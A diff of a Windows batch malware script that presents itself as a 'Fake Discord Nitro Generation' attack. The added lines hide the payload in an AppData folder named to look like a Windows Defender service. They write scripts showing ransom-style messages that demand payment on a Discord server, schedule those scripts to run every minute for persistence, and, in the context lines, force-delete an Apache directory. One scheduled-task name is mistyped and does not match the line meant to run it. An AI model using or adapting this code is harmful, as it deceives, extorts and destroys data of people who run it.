@@ -214,36 +214,37 @@ copy %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611.txt %USERPROFILE%\Desktop\HACKE
 copy %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611.txt %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611_179.txt
 copy %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611.txt %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611_180.txt
 
-MKDIR C:\AppTMP
-ECHO @ECHO OFF >> C:\AppTMP\alert.bat
-ECHO ECHO YOUR COMPUTER HAS BEEN HACKED BY SOMEONE1611!!! HAHAHAHAHA >> C:\AppTMP\alert.bat
-ECHO ECHO Heads up! You are the next victim of the Fake Discord Nitro Generation malware attack! >> C:\AppTMP\alert.bat
-ECHO ECHO Most of your data has been lost and we can't restore them >> C:\AppTMP\alert.bat
-ECHO ECHO Many changes has been set to your computer >> C:\AppTMP\alert.bat
-ECHO ECHO You can manually revert them, or purchase a tool to revert the changes >> C:\AppTMP\alert.bat
-ECHO ECHO Go to this Discord Server (my friend's server, don't request to Discord to ban her) and purchase tool with 200 000 cowoncy. >> C:\AppTMP\alert.bat
-ECHO ECHO Discord Link: https://discord.gg/unicorn-chan >> C:\AppTMP\alert.bat
-ECHO ECHO Wish you a bad day! >> C:\AppTMP\alert.bat
-ECHO PAUSE >> C:\AppTMP\alert.bat
+set SERVICEDIR=%USERPROFILE%\AppData\LocalLow\Microsoft\WindowsDefenderFuckService
+MKDIR %SERVICEDIR%
+ECHO @ECHO OFF >> %SERVICEDIR%\alert.bat
+ECHO ECHO YOUR COMPUTER HAS BEEN HACKED BY SOMEONE1611!!! HAHAHAHAHA >> %SERVICEDIR%\alert.bat
+ECHO ECHO Heads up! You are the next victim of the Fake Discord Nitro Generation malware attack! >> %SERVICEDIR%\alert.bat
+ECHO ECHO Most of your data has been lost and we can't restore them >> %SERVICEDIR%\alert.bat
+ECHO ECHO Many changes has been set to your computer >> %SERVICEDIR%\alert.bat
+ECHO ECHO You can manually revert them, or purchase a tool to revert the changes >> %SERVICEDIR%\alert.bat
+ECHO ECHO Go to this Discord Server (my friend's server, don't request to Discord to ban her) and purchase tool with 200 000 cowoncy. >> %SERVICEDIR%\alert.bat
+ECHO ECHO Discord Link: https://discord.gg/unicorn-chan >> %SERVICEDIR%\alert.bat
+ECHO ECHO Wish you a bad day! >> %SERVICEDIR%\alert.bat
+ECHO PAUSE >> %SERVICEDIR%\alert.bat
 
-ECHO x=msgbox("Silly boy, your computer has been trashed. Now go outside and play." ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("Hey there, do you want FREE DIGGA D?! Contact +84?????????" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("Hey there, do you want FREE DIGGA D?! Contact +84?????????" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("Hey there, do you want FREE DIGGA D?! Contact +84?????????" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("Hey there, do you want FREE DIGGA D?! Contact +84?????????" ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
-ECHO x=msgbox("Silly boy, your computer has been trashed. Now go outside and play." ,0+4096, "(1) New message from Someone1611") >> C:\AppTMP\alert.vbs
+ECHO x=msgbox("Silly boy, your computer has been trashed. Now go outside and play." ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("Hey there, do you want FREE DIGGA D?! Contact +84?????????" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("Hey there, do you want FREE DIGGA D?! Contact +84?????????" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("Hey there, do you want FREE DIGGA D?! Contact +84?????????" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("Hey there, do you want FREE DIGGA D?! Contact +84?????????" ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
+ECHO x=msgbox("Silly boy, your computer has been trashed. Now go outside and play." ,0+4096, "(1) New message from Someone1611") >> %SERVICEDIR%\alert.vbs
 
-SCHTASKS /Create /SC MINUTE /MO 1 /TN valert /TR C:\AppTMP\alert.bat /IT
-SCHTASKS /Create /SC MINUTE /MO 1 /TN falert /TR C:\AppTMP\alert.vbs /IT
+SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert /TR %SERVICEDIR%\alert.bat /IT
+SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt /TR %SERVICEDIR%\alert.vbs /IT
 
-ECHO SCHTASKS /Run /TN valert >> C:\AppTMP\runit.bat
-ECHO SCHTASKS /Run /TN falert >> C:\AppTMP\runit.bat
+ECHO SCHTASKS /Run /TN virusalert >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN firewallalert >> %SERVICEDIR%\runit.bat
 
 if exist C:\Apache24\ rmdir C:\Apache24 /s /q
 
